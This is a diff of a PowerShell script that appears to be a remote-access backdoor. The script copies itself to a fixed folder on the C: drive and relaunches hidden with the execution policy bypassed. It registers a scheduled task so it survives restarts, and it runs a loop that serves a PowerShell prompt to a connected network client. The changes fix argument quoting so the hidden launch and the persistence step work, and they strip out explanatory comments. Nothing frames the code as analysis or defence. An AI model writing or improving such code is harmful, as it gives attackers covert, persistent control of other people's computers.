@@ -25,7 +25,6 @@ if (-not (Test-Path $WorkDir)) {
 }
 
 # Detection: If we aren't running the specific file in C:\Win, we install and hand off
-# Note: $PSCommandPath is often null when running via IEX, which is what we want here to trigger install
 if ($PSCommandPath -ne $FullPath) {
     Log-Debug "Loader detected. Installing to $FullPath..."
     try {
@@ -39,10 +38,11 @@ if ($PSCommandPath -ne $FullPath) {
         }
 
         Log-Debug "Launching background process..."
-        Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$FullPath`""
+        # Fixed quoting and variable expansion to avoid the ":" variable reference error
+        $ProcArgs = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($FullPath)`""
+        Start-Process powershell.exe -ArgumentList $ProcArgs
         
         Log-Debug "Releasing terminal. Process will continue in background."
-        # Force terminate the loader session to prevent terminal hang
         Stop-Process -Id $PID 
     } catch {
         Log-Debug "Installation failed: $($_.Exception.Message)"
@@ -66,7 +66,7 @@ try {
 try {
     if (-not (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)) {
         Log-Debug "Registering Scheduled Task..."
-        $Arg = "-ExecutionPolicy Bypass -File $FullPath"
+        $Arg = "-ExecutionPolicy Bypass -File `"$($FullPath)`""
         if (-not $DebugMode) { $Arg = "-WindowStyle Hidden " + $Arg }
         
         $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $Arg
@@ -99,7 +99,6 @@ while ($true) {
         while ($client.Connected) {
             $writer.Write("PS " + (Get-Location).Path + "> ")
             
-            # Use Peek() to check for data without blocking forever, allowing us to detect disconnects
             $command = $reader.ReadLine()
             
             if ($null -eq $command) { 
